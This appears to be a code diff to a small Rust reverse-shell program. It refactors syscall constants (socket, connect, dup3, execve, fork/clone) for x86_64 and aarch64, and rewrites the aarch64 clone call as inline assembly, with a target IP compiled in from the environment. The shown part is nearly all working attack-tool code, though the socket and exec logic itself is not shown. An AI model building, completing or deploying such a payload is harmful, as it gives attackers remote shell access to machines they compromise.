@@ -7,21 +7,23 @@ const IP: &str = core::env!("IP");
 
 #[cfg(target_arch = "x86_64")]
 mod consts {
-    const SYS_FORK: usize = 57;
-    const SYS_DUP3: usize = 292;
-    const SYS_SOCKET: usize = 41;
-    const SYS_CONNECT: usize = 42;
-    const SYS_EXECVE: usize = 59;
-    const SYS_EXIT: usize = 60;
+    pub const SYS_FORK: usize = 57;
+    pub const SYS_DUP3: usize = 292;
+    pub const SYS_SOCKET: usize = 41;
+    pub const SYS_CONNECT: usize = 42;
+    pub const SYS_EXECVE: usize = 59;
+    pub const SYS_EXIT: usize = 60;
 }
 
 #[cfg(target_arch = "aarch64")]
 mod consts {
-    const SYS_DUP3: usize = 24;
-    const SYS_SOCKET: usize = 198;
-    const SYS_CONNECT: usize = 203;
-    const SYS_EXECVE: usize = 221;
-    const SYS_EXIT: usize = 93;
+    pub const SYS_CLONE: usize = 220;
+    pub const CLONE_FLAGS: usize = 0;
+    pub const SYS_DUP3: usize = 24;
+    pub const SYS_SOCKET: usize = 198;
+    pub const SYS_CONNECT: usize = 203;
+    pub const SYS_EXECVE: usize = 221;
+    pub const SYS_EXIT: usize = 93;
 }
 use consts::*;
 
@@ -164,15 +166,13 @@ fn fork() -> Result<ForkResult, i32> {
     #[cfg(target_arch = "aarch64")]
     unsafe {
         asm!(
-            "mov x8, {syscall}",
-            "mov x0, {flags}",
-            "mov x1, 0",
-            "mov x2, 0",
-            "mov x3, 0",
-            "mov x4, 0",
-            "svc 0",
-            syscall = const SYS_CLONE,
-            flags = const CLONE_FLAGS,
+            "svc #0",
+            in("x8") SYS_CLONE,
+            in("x0") CLONE_FLAGS,
+            in("x1") 0,
+            in("x2") 0,
+            in("x3") 0,
+            in("x4") 0,
             lateout("x0") result,
         );
     }
